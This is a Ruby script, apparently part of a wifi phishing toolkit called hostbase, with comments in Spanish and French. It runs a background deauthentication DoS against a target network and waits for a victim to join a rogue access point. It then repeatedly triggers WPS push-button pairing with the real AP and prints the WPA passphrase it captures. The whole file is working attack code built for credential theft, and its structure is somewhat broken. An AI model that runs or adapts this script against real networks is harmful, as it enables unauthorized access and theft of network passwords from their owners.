#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Salida del programo... limpiando los ficheros... reiniciando las tarjetas por defecto... ESPERA !\e[0m"
sleep 1
`service stop httpd`
sleep 4
Dir.chdir '/tmp/hostbase-1.1'
sleep 1
if File.exist?("hostapd.txt")
`rm -rf *.txt`
`rm -rf dhcpd.conf`
`rm -rf dhcpd.leases`
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`rm -rf *.pid`
puts "Limpieza de ficheros terminado... reiniciando las tarjetas por defecto y network-manager..."
`ip link set wlan5 down`
`iw dev wlan5 set type managed`
sleep 2
`ip link set wlan5 up`
sleep 4
`killall wpa_supplicant`
`killall sleep`
`ip link set wlan5 name wlan1`
`ifconfig wlan1 up`
sleep 4
`service start networkmanager`
sleep 5
puts "Bye..."
exit
else
`rm -rf *.pid`
`killall airbase-ng`
Dir.chdir '/tmp/hostbase-1.1'
sleep 1
`rm -rf *.txt`
`rm -rf dhcpd.conf`
`rm -rf dhcpd.leases`
`service start networkmanager`
sleep 5
puts "Bye..."
exit
end
end


class Init
def self.interface
load 'accessdos.rb'
puts "Starting your second wifi-card..."
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type monitor`
sleep 2
`ip link set #{$cartedos} up`
sleep 4
Init.activeDos
end

def self.activeDos
puts "Active DoS will start now..."
dos = Thread.new { `bash dos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Init.victimeAttente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end


def self.victimeAttente
puts "Esperamos el usario... apoya ctrl+c si quieres salir..."
loop do
sleep 1
if File.zero?("/tmp/hostapd.psk")
else
puts "\e[1;32m[*] Usario conectado.\e[0m"
Dir.chdir '/tmp'
sleep 1
Process.kill 15, File.read('/tmp/terminal.pid').to_i
`killall xterm`
`killall sleep`
sleep 1
Thread.list.each do |thread|   # ces 2 lignes sont a mettre après le loop do qui test le fichier hostapd.psk
  thread.exit unless thread == Thread.current
puts "Iniciando wpa_cli con la segunda tarjeta..."
Dir.chdir '/tmp/hostbase-1.1'
sleep 1
load 'historique.rb'
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type managed`
sleep 2
`ip link set #{$cartedos} up`
sleep 4
`rfkill unblock all`
sleep 4
       puts "Esperamos por el WPS push boton..."
`killall wpa_supplicant`
Dir.chdir '/etc'
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/hostbase-1.1/wpa_supplicant.conf /etc/`
sleep 1;
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
sleep 2
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}"   # On lance wpa_cli et wps_pbc en tant que thread
    sleep(120) # Temps avant la relance de la commande
  end
end
Init.wpaKey  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
sleep(5000000)
end
end

def self.wpaKey
Dir.chdir '/etc'
sleep 1
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] El boton WPS ha sido apoyado, WPA-PSK:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |psk|
   puts psk
end
end
end
end
end
